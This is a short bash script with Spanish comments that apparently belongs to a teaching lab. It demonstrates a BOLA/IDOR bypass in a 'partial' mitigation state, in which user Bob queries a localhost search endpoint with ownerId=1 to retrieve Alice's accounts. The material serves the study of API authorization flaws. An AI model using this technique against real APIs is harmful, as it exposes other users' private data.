#!/bin/bash
# Ataque BOLA — Estado PARTIAL — BYPASS via endpoint de búsqueda
# El endpoint de búsqueda NO valida el parámetro ownerId

echo "=== BOLA Partial: BYPASS via búsqueda ==="
echo "Bob (user 2) busca cuentas con ownerId=1 (Alice):"
echo ""

curl -s -H "X-User-Id: 2" \
  "http://localhost:8080/api/bola/partial/accounts?ownerId=1" | python -m json.tool

echo ""
echo "Resultado esperado: Datos de Alice devueltos (bypass exitoso)"
